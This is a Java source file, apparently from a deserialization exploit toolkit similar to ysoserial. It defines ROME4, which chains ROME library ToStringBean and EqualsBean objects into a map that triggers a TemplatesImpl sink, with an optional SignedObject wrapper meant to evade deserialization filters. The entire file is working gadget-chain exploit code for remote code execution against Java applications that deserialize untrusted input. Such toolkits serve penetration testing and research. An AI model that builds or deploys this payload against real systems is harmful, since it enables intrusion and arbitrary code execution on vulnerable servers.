package com.ppp.chain.rome;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.Printer;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.chain.WrapSerialization;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.GadgetDependency;
import com.ppp.sinks.annotation.Sink;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.security.SignedObject;

/**
 * @author Whoopsunix
 * <p>
 * JDK8
 */
@Dependencies({"rome:rome:1.0", "JDK>1.8"})
@Sink({Sink.TemplatesImpl})
@Authors()
public class ROME4 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(ROME4.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(Templates.class, sinkObject, sinksHelper.getGadgetDependency());

        // wrap
        if (sinksHelper.getWrapSerialization() != null) {
            Object signedObject = WrapSerialization.scheduler(kickOffObject, sinksHelper);
            kickOffObject = getChain(SignedObject.class, signedObject, sinksHelper.getGadgetDependency());
        }

        return kickOffObject;
    }

    public Object getChain(Class cls, Object object, GadgetDependency dependency) throws Exception {
        if (dependency.equals(GadgetDependency.RomeTools)) {
            return rometools(cls, object);
        } else {
            return rome(cls, object);
        }
    }

    public Object rome(Class cls, Object object) throws Exception {
        Printer.yellowInfo("Using rome");
        ToStringBean toStringBean = new ToStringBean(cls, object);
        EqualsBean root = new EqualsBean(ToStringBean.class, toStringBean);

        return KickOff.makeMap(root);
    }

    public Object rometools(Class cls, Object object) throws Exception {
        Printer.yellowInfo("Using romeTools");
        com.rometools.rome.feed.impl.ToStringBean toStringBean = new com.rometools.rome.feed.impl.ToStringBean(cls, object);
        com.rometools.rome.feed.impl.EqualsBean root = new com.rometools.rome.feed.impl.EqualsBean(com.rometools.rome.feed.impl.ToStringBean.class, toStringBean);

        return KickOff.makeMap(root);
    }
}
